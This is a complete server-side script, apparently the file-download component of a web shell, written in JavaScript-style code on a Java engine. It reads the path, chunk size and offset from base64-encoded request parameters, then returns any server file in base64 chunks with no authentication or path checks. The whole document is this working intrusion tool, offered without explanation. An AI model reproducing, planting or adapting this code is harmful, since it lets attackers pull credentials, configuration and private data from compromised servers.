<%

var paramMap = request.getParameterMap();
var szPath = "";
var szChunkSize = "0";
var szOffset = "0";

if (paramMap.containsKey("z0"))
    szPath = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z0")[0]), "UTF-8");
if (paramMap.containsKey("z1"))
    szChunkSize = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z1")[0]), "UTF-8");
if (paramMap.containsKey("z2"))
    szOffset = new java.lang.String(java.util.Base64.getDecoder().decode(paramMap.get("z2")[0]), "UTF-8");

var nChunkSize = java.lang.Integer.parseInt(szChunkSize);
var nOffset = java.lang.Long.parseLong(szOffset);

if (szPath == "") {
    echo("0|ERROR://File path is empty.");
} else {
    var file = new java.io.File(szPath);
    
    if (!file.exists() || !file.isFile()) {
        echo("0|ERROR://" + szPath + " not existed!");
    } else {
        var nFileSize = file.length();

        if (nOffset >= nFileSize) {
            echo("2|");
        } else {
            var raf = null;
            
            try {
                raf = new java.io.RandomAccessFile(file, "r");
                raf.seek(nOffset);

                var remaining = nFileSize - nOffset;
                var readSize = java.lang.Math.min(nChunkSize, remaining);

                var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, readSize);
                var bytesRead = raf.read(buffer);

                if (bytesRead === -1) {
                    echo("0|ERROR://Read failed or reached EOF prematurely.");
                } else {
                    if (bytesRead < readSize) {
                        var actualBuffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, bytesRead);
                        java.lang.System.arraycopy(buffer, 0, actualBuffer, 0, bytesRead);
                        buffer = actualBuffer;
                    }

                    var b64Data = java.util.Base64.getEncoder().encodeToString(buffer);

                    echo("1|" + b64Data);
                }

            } catch (ex) {
                echo("0|ERROR://" + ex.message);
            } finally {
                if (raf != null) {
                    try {
                        raf.close();
                    } catch (e) {

                    }
                }
            }
        }
    }
}

%>